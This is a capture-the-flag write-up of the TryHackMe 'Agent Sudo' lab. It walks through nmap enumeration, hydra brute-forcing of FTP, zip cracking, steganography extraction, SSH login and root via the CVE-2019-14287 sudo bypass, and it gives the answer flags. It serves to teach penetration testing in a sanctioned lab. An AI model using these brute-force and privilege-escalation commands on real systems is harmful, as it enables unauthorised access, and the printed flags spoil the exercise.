``IP Address: 10.10.45.45``

#### Nmap Enumeration:
```r
nmap -sV -A -sC 10.10.45.45
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-30 19:31 EST
Nmap scan report for 10.10.45.45
Host is up (0.12s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.64 seconds
```
``Question 1:``
How many open ports?

``Answer``: 3

``Question 2:``
How you redirect yourself to a secret page

Check the website at http:10.10.45.45.com 
![1.png](/Easy_Boxes/Agent_Sudo/img/1.png)

``Answer:`` user-agent

``Question 3:`` What is the agent name?
Based on the "Hint" I installed "user-agent switcher" browser extension. and configured user agent = C. Refreshed the page 

![2.png](/Easy_Boxes/Agent_Sudo/img/2.png)

``Answer:`` Chris

##### Done Enumerate the machine? Time to brute your way out.

``Question 4``: FTP password
Let's use ``hydra`` to brute force the ``FTP ``password

```r
hydra -l chris -P /usr/share/wordlists/rockyou.txt -u -f ftp://10.10.45.45 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-30 20:08:58
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.45.45:21/
[21][ftp] host: 10.10.45.45   login: chris   password: crystal
[STATUS] attack finished for 10.10.45.45 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```
``Answer:`` crystal

Let's check the content of the ftp server
``Question 5:`` Zip file password

```r
ftp 10.10.45.45
Connected to 10.10.45.45.
220 (vsFTPd 3.0.3)
Name (10.10.45.45:dcyberguy): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||41008|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
```
Let's download all file with the ``get`` tag

We see a ``To_agentJ.txt``. Open it
```r
cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```
Password is stored in the fake picture? which of them? cute-alien.jpg or cutie.png?

Let's start with cutie.png
To get string-like characters in pictures, we use the ``strings`` command and save it to a file called ``cutie.txt``
```
strings cutie.png > cutie.txt
```
Most of the output is gibberish, so let's use ``Binwalk``. Binwalk allows us to search binary images for any embedded files and/or executable code. 

```r
binwalk cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
Just like ``strings``, we can see a zip file that hides another file called ``To_agentR.txt``

Let's us the same command but add a -e flag to it.
```r
binwalk -e cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
We extracted a ``_cutie.png.extracted`` directory
```r
eza -l _cutie.png-1.extracted 
.rw-r--r-- 279k dcyberguy 30 Jan 20:58 365
.rw-r--r--  34k dcyberguy 30 Jan 20:58 365.zlib
.rw-r--r--  280 dcyberguy 30 Jan 20:58 8702.zip
```

We know this zip file is password-protected so we use zip2John to crack it
```r
zip2john 8702.zip > john_hash.txt
Created directory: /home/dcyberguy/.john
➜  _cutie.png.extracted eza -l                     
.rw-r--r-- 279k dcyberguy 30 Jan 20:54 365
.rw-r--r--  34k dcyberguy 30 Jan 20:54 365.zlib
.rw-r--r--  280 dcyberguy 30 Jan 20:54 8702.zip
.rw-r--r--  279 dcyberguy 30 Jan 21:03 john_hash.txt
➜  _cutie.png.extracted john john_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 3 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE 2/3 (2024-01-30 21:03) 1.020g/s 44310p/s 44310c/s 44310C/s 123456..Open
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Answer: ``alien``

Let us now open the zip folder and view contents
```r
7z e 8702.zip 

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=C.UTF-8 Threads:32 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Enter password (will not be echoed):
Everything is Ok

Size:       86
Compressed: 280
➜  _cutie.png.extracted eza -l
.rw-r--r-- 279k dcyberguy 30 Jan 20:54 365
.rw-r--r--  34k dcyberguy 30 Jan 20:54 365.zlib
.rw-r--r--  280 dcyberguy 30 Jan 20:54 8702.zip
.rw-r--r--  279 dcyberguy 30 Jan 21:03 john_hash.txt
.rw-r--r--   86 dcyberguy 29 Oct  2019 To_agentR.txt
➜  _cutie.png.extracted cat To_agentR.txt      
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
who is QXJlYTUX?

Using cyberchef, I was able to decode QXJlYTUX as "AREA51"

``Question 6``: steg password
``Answer:`` area51

``Question 7:`` Who is the other agent (in full name)

This question wasn't easy, I had to check docs for this one:

We will use steghide, that would help use find hidden files in image files. ``Steghide is useful in digital forensics investigations.``

```r
steghide --info cute-alien.jpg
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```
We noticed there is a message.txt embedded in the cute-alien.jpg image file. Let's retrieve it.
```r
steghide --extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".
➜  Easy_ctf eza -l
drwxr-xr-x    - dcyberguy 30 Jan 20:57 _cutie.png-0.extracted
drwxr-xr-x    - dcyberguy 30 Jan 20:58 _cutie.png-1.extracted
drwxr-xr-x    - dcyberguy 30 Jan 21:08 _cutie.png.extracted
.rw-r--r--  33k dcyberguy 29 Oct  2019 cute-alien.jpg
.rw-r--r-- 2.5k dcyberguy 30 Jan 20:35 cute-alien.txt
.rw-r--r--  35k dcyberguy 29 Oct  2019 cutie.png
.rw-r--r-- 3.0k dcyberguy 30 Jan 20:48 cutie.txt
.rw-r--r--  181 dcyberguy 30 Jan 21:45 message.txt
.rw-r--r--  217 dcyberguy 29 Oct  2019 To_agentJ.txt
➜  Easy_ctf cat message.txt  
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
Sweet!
``Answer:`` James

``Question 8:`` SSH password
``Answer:`` hackerrules!

``Question 10:``
Let login James account using ``SSH``

``ssh james@10.10.45.45`` 
```r
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7
james@agent-sudo:~$ 
```
``Answer:`` b03d975e8c92a7c04146cfa7a5a313c7

``Question 11``: What is the incident of the photo called?

```r
Copy Alien_autosy.jpg to attacker machine using python3 server
wget http://10.10.45.45:8000/Alien_autospy.jpg
--2024-01-30 21:55:13--  http://10.10.45.45:8000/Alien_autospy.jpg
Connecting to 10.10.45.45:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 42189 (41K) [image/jpeg]
Saving to: ‘Alien_autospy.jpg’

Alien_autospy.jpg                    100%[======================================================================>]  41.20K   229KB/s    in 0.2s    

2024-01-30 21:55:13 (229 KB/s) - ‘Alien_autospy.jpg’ saved [42189/42189]
```
Do a ``google reverse search`` and find the link that directs you to ``Foxnews``

``Answer:`` Roswell alien autopsy

``Sudo Vulnerability``: CVE-2019-14287
```r
# CVE-2019-14287 sudo Vulnerability Allows Bypass of User Restrictions

A new vulnerability was discovered earlier this week in the sudo package. Sudo is one of the most powerful and commonly used utilities installed on almost every UNIX and Linux-based operating system.

The sudo vulnerability [CVE-2019-14287](https://access.redhat.com/security/cve/cve-2019-14287) is a security policy bypass issue that provides a user or a program the ability to execute commands as root on a Linux system when the "sudoers configuration" explicitly disallows the root access. Exploiting the vulnerability requires the user to have sudo privileges that allow them to run commands with an arbitrary user ID, except root.
```
``Question: ``CVE number for the escalation:
``Answer: ``CVE-2019-14287

``Question``: What is the root flag?
```r
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# cat /root/root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
root@agent-sudo:~# 
```
``Answer``: b53a02f55b57d4439e3341834d70c062

``(BONUS) Question:`` Who is Agent R?
``Answer:`` DesKel

